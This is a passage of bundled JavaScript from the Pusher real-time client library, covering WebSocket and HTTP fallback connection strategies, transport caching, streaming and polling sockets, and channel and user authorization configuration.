              }
              runner = strategy.connect(minPriority, function(error2, handshake) {
                if (error2 && timer && timer.isRunning() && !options.failFast) {
                  return;
                }
                if (timer) {
                  timer.ensureAborted();
                }
                callback(error2, handshake);
              });
              return {
                abort: function() {
                  if (timer) {
                    timer.ensureAborted();
                  }
                  runner.abort();
                },
                forceMinPriority: function(p) {
                  runner.forceMinPriority(p);
                }
              };
            }
          }
          class best_connected_ever_strategy_BestConnectedEverStrategy {
            constructor(strategies) {
              this.strategies = strategies;
            }
            isSupported() {
              return any(this.strategies, util.method("isSupported"));
            }
            connect(minPriority, callback) {
              return connect(this.strategies, minPriority, function(i2, runners) {
                return function(error2, handshake) {
                  runners[i2].error = error2;
                  if (error2) {
                    if (allRunnersFailed(runners)) {
                      callback(true);
                    }
                    return;
                  }
                  apply(runners, function(runner) {
                    runner.forceMinPriority(handshake.transport.priority);
                  });
                  callback(null, handshake);
                };
              });
            }
          }
          function connect(strategies, minPriority, callbackBuilder) {
            var runners = map(strategies, function(strategy, i2, _, rs) {
              return strategy.connect(minPriority, callbackBuilder(i2, rs));
            });
            return {
              abort: function() {
                apply(runners, abortRunner);
              },
              forceMinPriority: function(p) {
                apply(runners, function(runner) {
                  runner.forceMinPriority(p);
                });
              }
            };
          }
          function allRunnersFailed(runners) {
            return collections_all(runners, function(runner) {
              return Boolean(runner.error);
            });
          }
          function abortRunner(runner) {
            if (!runner.error && !runner.aborted) {
              runner.abort();
              runner.aborted = true;
            }
          }
          class websocket_prioritized_cached_strategy_WebSocketPrioritizedCachedStrategy {
            constructor(strategy, transports2, options) {
              this.strategy = strategy;
              this.transports = transports2;
              this.ttl = options.ttl || 1800 * 1e3;
              this.usingTLS = options.useTLS;
              this.timeline = options.timeline;
            }
            isSupported() {
              return this.strategy.isSupported();
            }
            connect(minPriority, callback) {
              var usingTLS = this.usingTLS;
              var info = fetchTransportCache(usingTLS);
              var cacheSkipCount = info && info.cacheSkipCount ? info.cacheSkipCount : 0;
              var strategies = [this.strategy];
              if (info && info.timestamp + this.ttl >= util.now()) {
                var transport = this.transports[info.transport];
                if (transport) {
                  if (["ws", "wss"].includes(info.transport) || cacheSkipCount > 3) {
                    this.timeline.info({
                      cached: true,
                      transport: info.transport,
                      latency: info.latency
                    });
                    strategies.push(new sequential_strategy_SequentialStrategy([transport], {
                      timeout: info.latency * 2 + 1e3,
                      failFast: true
                    }));
                  } else {
                    cacheSkipCount++;
                  }
                }
              }
              var startTimestamp = util.now();
              var runner = strategies.pop().connect(minPriority, function cb(error2, handshake) {
                if (error2) {
                  flushTransportCache(usingTLS);
                  if (strategies.length > 0) {
                    startTimestamp = util.now();
                    runner = strategies.pop().connect(minPriority, cb);
                  } else {
                    callback(error2);
                  }
                } else {
                  storeTransportCache(usingTLS, handshake.transport.name, util.now() - startTimestamp, cacheSkipCount);
                  callback(null, handshake);
                }
              });
              return {
                abort: function() {
                  runner.abort();
                },
                forceMinPriority: function(p) {
                  minPriority = p;
                  if (runner) {
                    runner.forceMinPriority(p);
                  }
                }
              };
            }
          }
          function getTransportCacheKey(usingTLS) {
            return "pusherTransport" + (usingTLS ? "TLS" : "NonTLS");
          }
          function fetchTransportCache(usingTLS) {
            var storage = runtime.getLocalStorage();
            if (storage) {
              try {
                var serializedCache = storage[getTransportCacheKey(usingTLS)];
                if (serializedCache) {
                  return JSON.parse(serializedCache);
                }
              } catch (e2) {
                flushTransportCache(usingTLS);
              }
            }
            return null;
          }
          function storeTransportCache(usingTLS, transport, latency, cacheSkipCount) {
            var storage = runtime.getLocalStorage();
            if (storage) {
              try {
                storage[getTransportCacheKey(usingTLS)] = safeJSONStringify({
                  timestamp: util.now(),
                  transport,
                  latency,
                  cacheSkipCount
                });
              } catch (e2) {
              }
            }
          }
          function flushTransportCache(usingTLS) {
            var storage = runtime.getLocalStorage();
            if (storage) {
              try {
                delete storage[getTransportCacheKey(usingTLS)];
              } catch (e2) {
              }
            }
          }
          class delayed_strategy_DelayedStrategy {
            constructor(strategy, { delay: number2 }) {
              this.strategy = strategy;
              this.options = { delay: number2 };
            }
            isSupported() {
              return this.strategy.isSupported();
            }
            connect(minPriority, callback) {
              var strategy = this.strategy;
              var runner;
              var timer = new timers_OneOffTimer(this.options.delay, function() {
                runner = strategy.connect(minPriority, callback);
              });
              return {
                abort: function() {
                  timer.ensureAborted();
                  if (runner) {
                    runner.abort();
                  }
                },
                forceMinPriority: function(p) {
                  minPriority = p;
                  if (runner) {
                    runner.forceMinPriority(p);
                  }
                }
              };
            }
          }
          class IfStrategy {
            constructor(test, trueBranch, falseBranch) {
              this.test = test;
              this.trueBranch = trueBranch;
              this.falseBranch = falseBranch;
            }
            isSupported() {
              var branch = this.test() ? this.trueBranch : this.falseBranch;
              return branch.isSupported();
            }
            connect(minPriority, callback) {
              var branch = this.test() ? this.trueBranch : this.falseBranch;
              return branch.connect(minPriority, callback);
            }
          }
          class FirstConnectedStrategy {
            constructor(strategy) {
              this.strategy = strategy;
            }
            isSupported() {
              return this.strategy.isSupported();
            }
            connect(minPriority, callback) {
              var runner = this.strategy.connect(minPriority, function(error2, handshake) {
                if (handshake) {
                  runner.abort();
                }
                callback(error2, handshake);
              });
              return runner;
            }
          }
          function testSupportsStrategy(strategy) {
            return function() {
              return strategy.isSupported();
            };
          }
          var getDefaultStrategy = function(config, baseOptions, defineTransport) {
            var definedTransports = {};
            function defineTransportStrategy(name, type, priority, options, manager) {
              var transport = defineTransport(config, name, type, priority, options, manager);
              definedTransports[name] = transport;
              return transport;
            }
            var ws_options = Object.assign({}, baseOptions, {
              hostNonTLS: config.wsHost + ":" + config.wsPort,
              hostTLS: config.wsHost + ":" + config.wssPort,
              httpPath: config.wsPath
            });
            var wss_options = Object.assign({}, ws_options, {
              useTLS: true
            });
            var sockjs_options = Object.assign({}, baseOptions, {
              hostNonTLS: config.httpHost + ":" + config.httpPort,
              hostTLS: config.httpHost + ":" + config.httpsPort,
              httpPath: config.httpPath
            });
            var timeouts = {
              loop: true,
              timeout: 15e3,
              timeoutLimit: 6e4
            };
            var ws_manager = new transport_manager_TransportManager({
              minPingDelay: 1e4,
              maxPingDelay: config.activityTimeout
            });
            var streaming_manager = new transport_manager_TransportManager({
              lives: 2,
              minPingDelay: 1e4,
              maxPingDelay: config.activityTimeout
            });
            var ws_transport = defineTransportStrategy("ws", "ws", 3, ws_options, ws_manager);
            var wss_transport = defineTransportStrategy("wss", "ws", 3, wss_options, ws_manager);
            var sockjs_transport = defineTransportStrategy("sockjs", "sockjs", 1, sockjs_options);
            var xhr_streaming_transport = defineTransportStrategy("xhr_streaming", "xhr_streaming", 1, sockjs_options, streaming_manager);
            var xdr_streaming_transport = defineTransportStrategy("xdr_streaming", "xdr_streaming", 1, sockjs_options, streaming_manager);
            var xhr_polling_transport = defineTransportStrategy("xhr_polling", "xhr_polling", 1, sockjs_options);
            var xdr_polling_transport = defineTransportStrategy("xdr_polling", "xdr_polling", 1, sockjs_options);
            var ws_loop = new sequential_strategy_SequentialStrategy([ws_transport], timeouts);
            var wss_loop = new sequential_strategy_SequentialStrategy([wss_transport], timeouts);
            var sockjs_loop = new sequential_strategy_SequentialStrategy([sockjs_transport], timeouts);
            var streaming_loop = new sequential_strategy_SequentialStrategy([
              new IfStrategy(testSupportsStrategy(xhr_streaming_transport), xhr_streaming_transport, xdr_streaming_transport)
            ], timeouts);
            var polling_loop = new sequential_strategy_SequentialStrategy([
              new IfStrategy(testSupportsStrategy(xhr_polling_transport), xhr_polling_transport, xdr_polling_transport)
            ], timeouts);
            var http_loop = new sequential_strategy_SequentialStrategy([
              new IfStrategy(testSupportsStrategy(streaming_loop), new best_connected_ever_strategy_BestConnectedEverStrategy([
                streaming_loop,
                new delayed_strategy_DelayedStrategy(polling_loop, { delay: 4e3 })
              ]), polling_loop)
            ], timeouts);
            var http_fallback_loop = new IfStrategy(testSupportsStrategy(http_loop), http_loop, sockjs_loop);
            var wsStrategy;
            if (baseOptions.useTLS) {
              wsStrategy = new best_connected_ever_strategy_BestConnectedEverStrategy([
                ws_loop,
                new delayed_strategy_DelayedStrategy(http_fallback_loop, { delay: 2e3 })
              ]);
            } else {
              wsStrategy = new best_connected_ever_strategy_BestConnectedEverStrategy([
                ws_loop,
                new delayed_strategy_DelayedStrategy(wss_loop, { delay: 2e3 }),
                new delayed_strategy_DelayedStrategy(http_fallback_loop, { delay: 5e3 })
              ]);
            }
            return new websocket_prioritized_cached_strategy_WebSocketPrioritizedCachedStrategy(new FirstConnectedStrategy(new IfStrategy(testSupportsStrategy(ws_transport), wsStrategy, http_fallback_loop)), definedTransports, {
              ttl: 18e5,
              timeline: baseOptions.timeline,
              useTLS: baseOptions.useTLS
            });
          };
          var default_strategy = getDefaultStrategy;
          var transport_connection_initializer = function() {
            var self = this;
            self.timeline.info(self.buildTimelineMessage({
              transport: self.name + (self.options.useTLS ? "s" : "")
            }));
            if (self.hooks.isInitialized()) {
              self.changeState("initialized");
            } else if (self.hooks.file) {
              self.changeState("initializing");
              Dependencies.load(self.hooks.file, { useTLS: self.options.useTLS }, function(error2, callback) {
                if (self.hooks.isInitialized()) {
                  self.changeState("initialized");
                  callback(true);
                } else {
                  if (error2) {
                    self.onError(error2);
                  }
                  self.onClose();
                  callback(false);
                }
              });
            } else {
              self.onClose();
            }
          };
          var http_xdomain_request_hooks = {
            getRequest: function(socket) {
              var xdr = new window.XDomainRequest();
              xdr.ontimeout = function() {
                socket.emit("error", new RequestTimedOut());
                socket.close();
              };
              xdr.onerror = function(e2) {
                socket.emit("error", e2);
                socket.close();
              };
              xdr.onprogress = function() {
                if (xdr.responseText && xdr.responseText.length > 0) {
                  socket.onChunk(200, xdr.responseText);
                }
              };
              xdr.onload = function() {
                if (xdr.responseText && xdr.responseText.length > 0) {
                  socket.onChunk(200, xdr.responseText);
                }
                socket.emit("finished", 200);
                socket.close();
              };
              return xdr;
            },
            abortRequest: function(xdr) {
              xdr.ontimeout = xdr.onerror = xdr.onprogress = xdr.onload = null;
              xdr.abort();
            }
          };
          var http_xdomain_request = http_xdomain_request_hooks;
          const MAX_BUFFER_LENGTH = 256 * 1024;
          class http_request_HTTPRequest extends dispatcher_Dispatcher {
            constructor(hooks, method, url) {
              super();
              this.hooks = hooks;
              this.method = method;
              this.url = url;
            }
            start(payload) {
              this.position = 0;
              this.xhr = this.hooks.getRequest(this);
              this.unloader = () => {
                this.close();
              };
              runtime.addUnloadListener(this.unloader);
              this.xhr.open(this.method, this.url, true);
              if (this.xhr.setRequestHeader) {
                this.xhr.setRequestHeader("Content-Type", "application/json");
              }
              this.xhr.send(payload);
            }
            close() {
              if (this.unloader) {
                runtime.removeUnloadListener(this.unloader);
                this.unloader = null;
              }
              if (this.xhr) {
                this.hooks.abortRequest(this.xhr);
                this.xhr = null;
              }
            }
            onChunk(status, data) {
              while (true) {
                var chunk = this.advanceBuffer(data);
                if (chunk) {
                  this.emit("chunk", { status, data: chunk });
                } else {
                  break;
                }
              }
              if (this.isBufferTooLong(data)) {
                this.emit("buffer_too_long");
              }
            }
            advanceBuffer(buffer) {
              var unreadData = buffer.slice(this.position);
              var endOfLinePosition = unreadData.indexOf("\n");
              if (endOfLinePosition !== -1) {
                this.position += endOfLinePosition + 1;
                return unreadData.slice(0, endOfLinePosition);
              } else {
                return null;
              }
            }
            isBufferTooLong(buffer) {
              return this.position === buffer.length && buffer.length > MAX_BUFFER_LENGTH;
            }
          }
          var State;
          (function(State2) {
            State2[State2["CONNECTING"] = 0] = "CONNECTING";
            State2[State2["OPEN"] = 1] = "OPEN";
            State2[State2["CLOSED"] = 3] = "CLOSED";
          })(State || (State = {}));
          var state = State;
          var autoIncrement = 1;
          class http_socket_HTTPSocket {
            constructor(hooks, url) {
              this.hooks = hooks;
              this.session = randomNumber(1e3) + "/" + randomString(8);
              this.location = getLocation(url);
              this.readyState = state.CONNECTING;
              this.openStream();
            }
            send(payload) {
              return this.sendRaw(JSON.stringify([payload]));
            }
            ping() {
              this.hooks.sendHeartbeat(this);
            }
            close(code, reason) {
              this.onClose(code, reason, true);
            }
            sendRaw(payload) {
              if (this.readyState === state.OPEN) {
                try {
                  runtime.createSocketRequest("POST", getUniqueURL(getSendURL(this.location, this.session))).start(payload);
                  return true;
                } catch (e2) {
                  return false;
                }
              } else {
                return false;
              }
            }
            reconnect() {
              this.closeStream();
              this.openStream();
            }
            onClose(code, reason, wasClean) {
              this.closeStream();
              this.readyState = state.CLOSED;
              if (this.onclose) {
                this.onclose({
                  code,
                  reason,
                  wasClean
                });
              }
            }
            onChunk(chunk) {
              if (chunk.status !== 200) {
                return;
              }
              if (this.readyState === state.OPEN) {
                this.onActivity();
              }
              var payload;
              var type = chunk.data.slice(0, 1);
              switch (type) {
                case "o":
                  payload = JSON.parse(chunk.data.slice(1) || "{}");
                  this.onOpen(payload);
                  break;
                case "a":
                  payload = JSON.parse(chunk.data.slice(1) || "[]");
                  for (var i2 = 0; i2 < payload.length; i2++) {
                    this.onEvent(payload[i2]);
                  }
                  break;
                case "m":
                  payload = JSON.parse(chunk.data.slice(1) || "null");
                  this.onEvent(payload);
                  break;
                case "h":
                  this.hooks.onHeartbeat(this);
                  break;
                case "c":
                  payload = JSON.parse(chunk.data.slice(1) || "[]");
                  this.onClose(payload[0], payload[1], true);
                  break;
              }
            }
            onOpen(options) {
              if (this.readyState === state.CONNECTING) {
                if (options && options.hostname) {
                  this.location.base = replaceHost(this.location.base, options.hostname);
                }
                this.readyState = state.OPEN;
                if (this.onopen) {
                  this.onopen();
                }
              } else {
                this.onClose(1006, "Server lost session", true);
              }
            }
            onEvent(event) {
              if (this.readyState === state.OPEN && this.onmessage) {
                this.onmessage({ data: event });
              }
            }
            onActivity() {
              if (this.onactivity) {
                this.onactivity();
              }
            }
            onError(error2) {
              if (this.onerror) {
                this.onerror(error2);
              }
            }
            openStream() {
              this.stream = runtime.createSocketRequest("POST", getUniqueURL(this.hooks.getReceiveURL(this.location, this.session)));
              this.stream.bind("chunk", (chunk) => {
                this.onChunk(chunk);
              });
              this.stream.bind("finished", (status) => {
                this.hooks.onFinished(this, status);
              });
              this.stream.bind("buffer_too_long", () => {
                this.reconnect();
              });
              try {
                this.stream.start();
              } catch (error2) {
                util.defer(() => {
                  this.onError(error2);
                  this.onClose(1006, "Could not start streaming", false);
                });
              }
            }
            closeStream() {
              if (this.stream) {
                this.stream.unbind_all();
                this.stream.close();
                this.stream = null;
              }
            }
          }
          function getLocation(url) {
            var parts = /([^\?]*)\/*(\??.*)/.exec(url);
            return {
              base: parts[1],
              queryString: parts[2]
            };
          }
          function getSendURL(url, session) {
            return url.base + "/" + session + "/xhr_send";
          }
          function getUniqueURL(url) {
            var separator = url.indexOf("?") === -1 ? "?" : "&";
            return url + separator + "t=" + +/* @__PURE__ */ new Date() + "&n=" + autoIncrement++;
          }
          function replaceHost(url, hostname) {
            var urlParts = /(https?:\/\/)([^\/:]+)((\/|:)?.*)/.exec(url);
            return urlParts[1] + hostname + urlParts[3];
          }
          function randomNumber(max2) {
            return runtime.randomInt(max2);
          }
          function randomString(length) {
            var result = [];
            for (var i2 = 0; i2 < length; i2++) {
              result.push(randomNumber(32).toString(32));
            }
            return result.join("");
          }
          var http_socket = http_socket_HTTPSocket;
          var http_streaming_socket_hooks = {
            getReceiveURL: function(url, session) {
              return url.base + "/" + session + "/xhr_streaming" + url.queryString;
            },
            onHeartbeat: function(socket) {
              socket.sendRaw("[]");
            },
            sendHeartbeat: function(socket) {
              socket.sendRaw("[]");
            },
            onFinished: function(socket, status) {
              socket.onClose(1006, "Connection interrupted (" + status + ")", false);
            }
          };
          var http_streaming_socket = http_streaming_socket_hooks;
          var http_polling_socket_hooks = {
            getReceiveURL: function(url, session) {
              return url.base + "/" + session + "/xhr" + url.queryString;
            },
            onHeartbeat: function() {
            },
            sendHeartbeat: function(socket) {
              socket.sendRaw("[]");
            },
            onFinished: function(socket, status) {
              if (status === 200) {
                socket.reconnect();
              } else {
                socket.onClose(1006, "Connection interrupted (" + status + ")", false);
              }
            }
          };
          var http_polling_socket = http_polling_socket_hooks;
          var http_xhr_request_hooks = {
            getRequest: function(socket) {
              var Constructor = runtime.getXHRAPI();
              var xhr = new Constructor();
              xhr.onreadystatechange = xhr.onprogress = function() {
                switch (xhr.readyState) {
                  case 3:
                    if (xhr.responseText && xhr.responseText.length > 0) {
                      socket.onChunk(xhr.status, xhr.responseText);
                    }
                    break;
                  case 4:
                    if (xhr.responseText && xhr.responseText.length > 0) {
                      socket.onChunk(xhr.status, xhr.responseText);
                    }
                    socket.emit("finished", xhr.status);
                    socket.close();
                    break;
                }
              };
              return xhr;
            },
            abortRequest: function(xhr) {
              xhr.onreadystatechange = null;
              xhr.abort();
            }
          };
          var http_xhr_request = http_xhr_request_hooks;
          var HTTP = {
            createStreamingSocket(url) {
              return this.createSocket(http_streaming_socket, url);
            },
            createPollingSocket(url) {
              return this.createSocket(http_polling_socket, url);
            },
            createSocket(hooks, url) {
              return new http_socket(hooks, url);
            },
            createXHR(method, url) {
              return this.createRequest(http_xhr_request, method, url);
            },
            createRequest(hooks, method, url) {
              return new http_request_HTTPRequest(hooks, method, url);
            }
          };
          var http_http = HTTP;
          http_http.createXDR = function(method, url) {
            return this.createRequest(http_xdomain_request, method, url);
          };
          var web_http_http = http_http;
          var Runtime = {
            nextAuthCallbackID: 1,
            auth_callbacks: {},
            ScriptReceivers,
            DependenciesReceivers,
            getDefaultStrategy: default_strategy,
            Transports: transports_transports,
            transportConnectionInitializer: transport_connection_initializer,
            HTTPFactory: web_http_http,
            TimelineTransport: jsonp_timeline,
            getXHRAPI() {
              return window.XMLHttpRequest;
            },
            getWebSocketAPI() {
              return window.WebSocket || window.MozWebSocket;
            },
            setup(PusherClass) {
              window.Pusher = PusherClass;
              var initializeOnDocumentBody = () => {
                this.onDocumentBody(PusherClass.ready);
              };
              if (!window.JSON) {
                Dependencies.load("json2", {}, initializeOnDocumentBody);
              } else {
                initializeOnDocumentBody();
              }
            },
            getDocument() {
              return document;
            },
            getProtocol() {
              return this.getDocument().location.protocol;
            },
            getAuthorizers() {
              return { ajax: xhr_auth, jsonp: jsonp_auth };
            },
            onDocumentBody(callback) {
              if (document.body) {
                callback();
              } else {
                setTimeout(() => {
                  this.onDocumentBody(callback);
                }, 0);
              }
            },
            createJSONPRequest(url, data) {
              return new jsonp_request_JSONPRequest(url, data);
            },
            createScriptRequest(src) {
              return new ScriptRequest(src);
            },
            getLocalStorage() {
              try {
                return window.localStorage;
              } catch (e2) {
                return void 0;
              }
            },
            createXHR() {
              if (this.getXHRAPI()) {
                return this.createXMLHttpRequest();
              } else {
                return this.createMicrosoftXHR();
              }
            },
            createXMLHttpRequest() {
              var Constructor = this.getXHRAPI();
              return new Constructor();
            },
            createMicrosoftXHR() {
              return new ActiveXObject("Microsoft.XMLHTTP");
            },
            getNetwork() {
              return net_info_Network;
            },
            createWebSocket(url) {
              var Constructor = this.getWebSocketAPI();
              return new Constructor(url);
            },
            createSocketRequest(method, url) {
              if (this.isXHRSupported()) {
                return this.HTTPFactory.createXHR(method, url);
              } else if (this.isXDRSupported(url.indexOf("https:") === 0)) {
                return this.HTTPFactory.createXDR(method, url);
              } else {
                throw "Cross-origin HTTP requests are not supported";
              }
            },
            isXHRSupported() {
              var Constructor = this.getXHRAPI();
              return Boolean(Constructor) && new Constructor().withCredentials !== void 0;
            },
            isXDRSupported(useTLS) {
              var protocol = useTLS ? "https:" : "http:";
              var documentProtocol = this.getProtocol();
              return Boolean(window["XDomainRequest"]) && documentProtocol === protocol;
            },
            addUnloadListener(listener) {
              if (window.addEventListener !== void 0) {
                window.addEventListener("unload", listener, false);
              } else if (window.attachEvent !== void 0) {
                window.attachEvent("onunload", listener);
              }
            },
            removeUnloadListener(listener) {
              if (window.addEventListener !== void 0) {
                window.removeEventListener("unload", listener, false);
              } else if (window.detachEvent !== void 0) {
                window.detachEvent("onunload", listener);
              }
            },
            randomInt(max2) {
              const random = function() {
                const crypto = window.crypto || window["msCrypto"];
                const random2 = crypto.getRandomValues(new Uint32Array(1))[0];
                return random2 / Math.pow(2, 32);
              };
              return Math.floor(random() * max2);
            }
          };
          var runtime = Runtime;
          var TimelineLevel;
          (function(TimelineLevel2) {
            TimelineLevel2[TimelineLevel2["ERROR"] = 3] = "ERROR";
            TimelineLevel2[TimelineLevel2["INFO"] = 6] = "INFO";
            TimelineLevel2[TimelineLevel2["DEBUG"] = 7] = "DEBUG";
          })(TimelineLevel || (TimelineLevel = {}));
          var timeline_level = TimelineLevel;
          class timeline_Timeline {
            constructor(key, session, options) {
              this.key = key;
              this.session = session;
              this.events = [];
              this.options = options || {};
              this.sent = 0;
              this.uniqueID = 0;
            }
            log(level, event) {
              if (level <= this.options.level) {
                this.events.push(extend({}, event, { timestamp: util.now() }));
                if (this.options.limit && this.events.length > this.options.limit) {
                  this.events.shift();
                }
              }
            }
            error(event) {
              this.log(timeline_level.ERROR, event);
            }
            info(event) {
              this.log(timeline_level.INFO, event);
            }
            debug(event) {
              this.log(timeline_level.DEBUG, event);
            }
            isEmpty() {
              return this.events.length === 0;
            }
            send(sendfn, callback) {
              var data = extend({
                session: this.session,
                bundle: this.sent + 1,
                key: this.key,
                lib: "js",
                version: this.options.version,
                cluster: this.options.cluster,
                features: this.options.features,
                timeline: this.events
              }, this.options.params);
              this.events = [];
              sendfn(data, (error2, result) => {
                if (!error2) {
                  this.sent++;
                }
                if (callback) {
                  callback(error2, result);
                }
              });
              return true;
            }
            generateUniqueID() {
              this.uniqueID++;
              return this.uniqueID;
            }
          }
          class transport_strategy_TransportStrategy {
            constructor(name, priority, transport, options) {
              this.name = name;
              this.priority = priority;
              this.transport = transport;
              this.options = options || {};
            }
            isSupported() {
              return this.transport.isSupported({
                useTLS: this.options.useTLS
              });
            }
            connect(minPriority, callback) {
              if (!this.isSupported()) {
                return failAttempt(new UnsupportedStrategy(), callback);
              } else if (this.priority < minPriority) {
                return failAttempt(new TransportPriorityTooLow(), callback);
              }
              var connected = false;
              var transport = this.transport.createConnection(this.name, this.priority, this.options.key, this.options);
              var handshake = null;
              var onInitialized = function() {
                transport.unbind("initialized", onInitialized);
                transport.connect();
              };
              var onOpen = function() {
                handshake = factory.createHandshake(transport, function(result) {
                  connected = true;
                  unbindListeners();
                  callback(null, result);
                });
              };
              var onError = function(error2) {
                unbindListeners();
                callback(error2);
              };
              var onClosed = function() {
                unbindListeners();
                var serializedTransport;
                serializedTransport = safeJSONStringify(transport);
                callback(new TransportClosed(serializedTransport));
              };
              var unbindListeners = function() {
                transport.unbind("initialized", onInitialized);
                transport.unbind("open", onOpen);
                transport.unbind("error", onError);
                transport.unbind("closed", onClosed);
              };
              transport.bind("initialized", onInitialized);
              transport.bind("open", onOpen);
              transport.bind("error", onError);
              transport.bind("closed", onClosed);
              transport.initialize();
              return {
                abort: () => {
                  if (connected) {
                    return;
                  }
                  unbindListeners();
                  if (handshake) {
                    handshake.close();
                  } else {
                    transport.close();
                  }
                },
                forceMinPriority: (p) => {
                  if (connected) {
                    return;
                  }
                  if (this.priority < p) {
                    if (handshake) {
                      handshake.close();
                    } else {
                      transport.close();
                    }
                  }
                }
              };
            }
          }
          function failAttempt(error2, callback) {
            util.defer(function() {
              callback(error2);
            });
            return {
              abort: function() {
              },
              forceMinPriority: function() {
              }
            };
          }
          const { Transports: strategy_builder_Transports } = runtime;
          var strategy_builder_defineTransport = function(config, name, type, priority, options, manager) {
            var transportClass = strategy_builder_Transports[type];
            if (!transportClass) {
              throw new UnsupportedTransport(type);
            }
            var enabled = (!config.enabledTransports || arrayIndexOf(config.enabledTransports, name) !== -1) && (!config.disabledTransports || arrayIndexOf(config.disabledTransports, name) === -1);
            var transport;
            if (enabled) {
              options = Object.assign({ ignoreNullOrigin: config.ignoreNullOrigin }, options);
              transport = new transport_strategy_TransportStrategy(name, priority, manager ? manager.getAssistant(transportClass) : transportClass, options);
            } else {
              transport = strategy_builder_UnsupportedStrategy;
            }
            return transport;
          };
          var strategy_builder_UnsupportedStrategy = {
            isSupported: function() {
              return false;
            },
            connect: function(_, callback) {
              var deferred = util.defer(function() {
                callback(new UnsupportedStrategy());
              });
              return {
                abort: function() {
                  deferred.ensureAborted();
                },
                forceMinPriority: function() {
                }
              };
            }
          };
          function validateOptions(options) {
            if (options == null) {
              throw "You must pass an options object";
            }
            if (options.cluster == null) {
              throw "Options object must provide a cluster";
            }
            if ("disableStats" in options) {
              logger.warn("The disableStats option is deprecated in favor of enableStats");
            }
          }
          const composeChannelQuery = (params, authOptions) => {
            var query = "socket_id=" + encodeURIComponent(params.socketId);
            for (var key in authOptions.params) {
              query += "&" + encodeURIComponent(key) + "=" + encodeURIComponent(authOptions.params[key]);
            }
            if (authOptions.paramsProvider != null) {
              let dynamicParams = authOptions.paramsProvider();
              for (var key in dynamicParams) {
                query += "&" + encodeURIComponent(key) + "=" + encodeURIComponent(dynamicParams[key]);
              }
            }
            return query;
          };
          const UserAuthenticator = (authOptions) => {
            if (typeof runtime.getAuthorizers()[authOptions.transport] === "undefined") {
              throw `'${authOptions.transport}' is not a recognized auth transport`;
            }
            return (params, callback) => {
              const query = composeChannelQuery(params, authOptions);
              runtime.getAuthorizers()[authOptions.transport](runtime, query, authOptions, AuthRequestType.UserAuthentication, callback);
            };
          };
          var user_authenticator = UserAuthenticator;
          const channel_authorizer_composeChannelQuery = (params, authOptions) => {
            var query = "socket_id=" + encodeURIComponent(params.socketId);
            query += "&channel_name=" + encodeURIComponent(params.channelName);
            for (var key in authOptions.params) {
              query += "&" + encodeURIComponent(key) + "=" + encodeURIComponent(authOptions.params[key]);
            }
            if (authOptions.paramsProvider != null) {
              let dynamicParams = authOptions.paramsProvider();
              for (var key in dynamicParams) {
                query += "&" + encodeURIComponent(key) + "=" + encodeURIComponent(dynamicParams[key]);
              }
            }
            return query;
          };
          const ChannelAuthorizer = (authOptions) => {
            if (typeof runtime.getAuthorizers()[authOptions.transport] === "undefined") {
              throw `'${authOptions.transport}' is not a recognized auth transport`;
            }
            return (params, callback) => {
              const query = channel_authorizer_composeChannelQuery(params, authOptions);
              runtime.getAuthorizers()[authOptions.transport](runtime, query, authOptions, AuthRequestType.ChannelAuthorization, callback);
            };
          };
          var channel_authorizer = ChannelAuthorizer;
          const ChannelAuthorizerProxy = (pusher2, authOptions, channelAuthorizerGenerator) => {
            const deprecatedAuthorizerOptions = {
              authTransport: authOptions.transport,
              authEndpoint: authOptions.endpoint,
              auth: {
                params: authOptions.params,
                headers: authOptions.headers
              }
            };
            return (params, callback) => {
              const channel = pusher2.channel(params.channelName);
              const channelAuthorizer = channelAuthorizerGenerator(channel, deprecatedAuthorizerOptions);
              channelAuthorizer.authorize(params.socketId, callback);
            };
          };
          function getConfig(opts, pusher2) {
            let config = {
              activityTimeout: opts.activityTimeout || defaults2.activityTimeout,
              cluster: opts.cluster,
              httpPath: opts.httpPath || defaults2.httpPath,
              httpPort: opts.httpPort || defaults2.httpPort,
              httpsPort: opts.httpsPort || defaults2.httpsPort,
              pongTimeout: opts.pongTimeout || defaults2.pongTimeout,
              statsHost: opts.statsHost || defaults2.stats_host,
              unavailableTimeout: opts.unavailableTimeout || defaults2.unavailableTimeout,
              wsPath: opts.wsPath || defaults2.wsPath,
              wsPort: opts.wsPort || defaults2.wsPort,
              wssPort: opts.wssPort || defaults2.wssPort,
              enableStats: getEnableStatsConfig(opts),
              httpHost: getHttpHost(opts),
              useTLS: shouldUseTLS(opts),
              wsHost: getWebsocketHost(opts),
              userAuthenticator: buildUserAuthenticator(opts),
              channelAuthorizer: buildChannelAuthorizer(opts, pusher2)
            };
            if ("disabledTransports" in opts)
              config.disabledTransports = opts.disabledTransports;
            if ("enabledTransports" in opts)
              config.enabledTransports = opts.enabledTransports;
            if ("ignoreNullOrigin" in opts)
              config.ignoreNullOrigin = opts.ignoreNullOrigin;
            if ("timelineParams" in opts)
              config.timelineParams = opts.timelineParams;
            if ("nacl" in opts) {
              config.nacl = opts.nacl;
            }
            return config;
          }
          function getHttpHost(opts) {
            if (opts.httpHost) {
              return opts.httpHost;
            }
            if (opts.cluster) {
              return `sockjs-${opts.cluster}.pusher.com`;
            }
            return defaults2.httpHost;
          }
          function getWebsocketHost(opts) {
            if (opts.wsHost) {
              return opts.wsHost;
            }
            return getWebsocketHostFromCluster(opts.cluster);
          }
          function getWebsocketHostFromCluster(cluster) {
            return `ws-${cluster}.pusher.com`;
          }
          function shouldUseTLS(opts) {
            if (runtime.getProtocol() === "https:") {
              return true;
            } else if (opts.forceTLS === false) {
              return false;
            }
            return true;
          }
          function getEnableStatsConfig(opts) {
            if ("enableStats" in opts) {
              return opts.enableStats;
            }
            if ("disableStats" in opts) {
              return !opts.disableStats;
            }
            return false;
          }
          const hasCustomHandler = (auth) => {
            return "customHandler" in auth && auth["customHandler"] != null;
          };
          function buildUserAuthenticator(opts) {
            const userAuthentication = Object.assign(Object.assign({}, defaults2.userAuthentication), opts.userAuthentication);
            if (hasCustomHandler(userAuthentication)) {
              return userAuthentication["customHandler"];
            }
            return user_authenticator(userAuthentication);
          }
          function buildChannelAuth(opts, pusher2) {
            let channelAuthorization;
            if ("channelAuthorization" in opts) {
              channelAuthorization = Object.assign(Object.assign({}, defaults2.channelAuthorization), opts.channelAuthorization);
            } else {
              channelAuthorization = {
                transport: opts.authTransport || defaults2.authTransport,
                endpoint: opts.authEndpoint || defaults2.authEndpoint
              };
              if ("auth" in opts) {
                if ("params" in opts.auth)
                  channelAuthorization.params = opts.auth.params;
                if ("headers" in opts.auth)
                  channelAuthorization.headers = opts.auth.headers;
              }
              if ("authorizer" in opts) {
                return {
